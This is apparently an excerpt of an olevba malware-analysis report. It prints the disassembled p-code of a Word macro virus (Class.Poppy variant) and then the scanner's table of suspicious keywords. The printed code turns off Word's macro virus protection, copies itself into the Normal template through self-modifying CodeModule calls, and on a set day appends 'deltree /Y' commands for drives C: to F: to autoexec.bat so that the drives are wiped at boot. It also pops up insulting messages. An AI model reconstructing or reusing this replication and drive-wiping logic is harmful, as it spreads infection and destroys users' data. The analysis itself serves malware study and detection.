' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #120:
' Line #121:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #122:
' 	EndIfBlock 
' Line #123:
' Line #124:
' 	Ld flagio 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld flagaltro 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #125:
' 	LitStr 0x000B "c:\cont.dbl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #126:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo cpyacti 
' 	EndIf 
' Line #127:
' 	LitDI2 0x0001 
' 	St count 
' Line #128:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #129:
' 	LitDI2 0x0001 
' 	Ld stress 
' 	LineInput 
' Line #130:
' 	Ld count 
' 	Ld stress 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #131:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #132:
' 	Loop 
' Line #133:
' 	Label cpyacti 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #135:
' 	EndIfBlock 
' Line #136:
' Line #137:
' 	LitStr 0x000B "c:\cont.dbl"
' 	ArgsCall Kill 0x0001 
' Line #138:
' Line #139:
' 	ArgsCall Read 0x0000 
' Line #140:
' 	LitDI2 0x0006 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0003 
' 	Lt 
' 	IfBlock 
' Line #141:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #142:
' 	LitStr 0x000D "Macro Carrier"
' 	MemStWith Title 
' Line #143:
' 	LitStr 0x000D "Dream Blaster"
' 	MemStWith Author 
' Line #144:
' 	LitStr 0x0005 "Minny"
' 	MemStWith Keywords 
' Line #145:
' 	ArgsMemCallWith Execute 0x0000 
' Line #146:
' 	EndWith 
' Line #147:
' 	EndIfBlock 
' Line #148:
' Line #149:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #150:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #151:
' 	EndIfBlock 
' Line #152:
' Line #153:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0011 
' 	Eq 
' 	IfBlock 
' Line #154:
' 	LitStr 0x000C "c:\minny.log"
' 	Ld vbHidden 
' 	Ld vbSystem 
' 	Add 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #155:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #156:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #157:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #158:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld stress 
' 	InputItem 
' 	InputDone 
' Line #159:
' 	Loop 
' Line #160:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #161:
' Line #162:
' 	Ld stress 
' 	LitStr 0x0016 "you are simply a bitch"
' 	Ne 
' 	IfBlock 
' Line #163:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #164:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "deltree /Y f:\*"
' 	PrintItemNL 
' Line #165:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "deltree /Y e:\*"
' 	PrintItemNL 
' Line #166:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "deltree /Y d:\*"
' 	PrintItemNL 
' Line #167:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "deltree /Y c:\*"
' 	PrintItemNL 
' Line #168:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "rem Created by Dream Blaster"
' 	PrintItemNL 
' Line #169:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "rem Minny, you are simply a bitch"
' 	PrintItemNL 
' Line #170:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #171:
' 	EndIfBlock 
' Line #172:
' 	ElseBlock 
' Line #173:
' 	LitStr 0x0028 "You are protected from this virus damage"
' 	ArgsCall MsgBox 0x0001 
' Line #174:
' 	EndIfBlock 
' Line #175:
' 	EndIfBlock 
' Line #176:
' Line #177:
' 	Ld stato 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #178:
' Line #179:
' 	OnError (GoTo 0) 
' Line #180:
' 	EndSub 
' Line #181:
' 	FuncDefn (Private Sub Document_Open())
' Line #182:
' 	Dim 
' 	VarDefn flagaltro (As Boolean)
' Line #183:
' 	Dim 
' 	VarDefn flagio (As Boolean)
' Line #184:
' 	Dim 
' 	VarDefn count (As Integer)
' Line #185:
' 	Dim 
' 	VarDefn bry (As Variant)
' Line #186:
' Line #187:
' 	OnError (Resume Next) 
' Line #188:
' Line #189:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #190:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #191:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #192:
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' Line #193:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #194:
' 	EndWith 
' Line #195:
' Line #196:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #197:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #198:
' Line #199:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #200:
' Line #201:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #202:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #203:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #204:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #205:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0014 "Dim stato As Boolean"
' 	Eq 
' 	IfBlock 
' Line #206:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #207:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #208:
' 	ExitFor 
' Line #209:
' 	EndIfBlock 
' Line #210:
' 	EndIfBlock 
' Line #211:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #212:
' Line #213:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #214:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #215:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #216:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #217:
' Line #218:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #219:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #220:
' 	Loop 
' Line #221:
' Line #222:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #223:
' Line #224:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #225:
' 	EndIfBlock 
' Line #226:
' Line #227:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #228:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #229:
' Line #230:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #231:
' Line #232:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #233:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	IfBlock 
' Line #234:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #235:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #236:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0018 "Dim flagaltro As Boolean"
' 	Eq 
' 	IfBlock 
' Line #237:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #238:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #239:
' 	ExitFor 
' Line #240:
' 	EndIfBlock 
' Line #241:
' 	EndIfBlock 
' Line #242:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #243:
' Line #244:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #245:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #246:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #247:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #248:
' Line #249:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #250:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #251:
' 	Loop 
' Line #252:
' Line #253:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #254:
' Line #255:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #256:
' 	EndIfBlock 
' Line #257:
' Line #258:
' 	OnError (GoTo 0) 
' Line #259:
' 	EndSub 
' Line #260:
' 	FuncDefn (Sub AutoOpen())
' Line #261:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:43 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #262:
' 	OnError out 
' Line #263:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #264:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #265:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #266:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #267:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #268:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #269:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #270:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #271:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #272:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #273:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #274:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #275:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #276:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #277:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #278:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #279:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #280:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #281:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #282:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #283:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #284:
' 	EndIfBlock 
' Line #285:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #286:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #287:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #288:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "I Think "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " is a big stupid jerk!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x0021 "VicodinES Loves You / Class.Poppy"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #289:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #290:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #291:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #292:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd CodeModule 
' 	With 
' Line #293:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #294:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #295:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #296:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith DeleteLines 0x0001 
' Line #297:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #298:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #299:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #300:
' 	EndWith 
' Line #301:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #302:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #303:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #304:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd CodeModule 
' 	With 
' Line #305:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #306:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #307:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #308:
' 	LitDI2 0x0047 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #309:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #310:
' 	EndWith 
' Line #311:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #312:
' 	EndIfBlock 
' Line #313:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #314:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd CodeModule 
' 	With 
' Line #315:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #316:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0048 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #317:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #318:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	Ld Application 
' 	MemLd Assistant 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #319:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #320:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #321:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #322:
' 	EndWith 
' Line #323:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #324:
' 	Label out 
' Line #325:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #326:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #327:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #328:
' 	EndSub 
' Line #329:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #330:
' 	FuncDefn (Sub ViewVBCode())
' Line #331:
' 	QuoteRem 0x0000 0x0051 "rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy"
' Line #332:
' 	EndSub 
' Line #333:
' Line #334:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

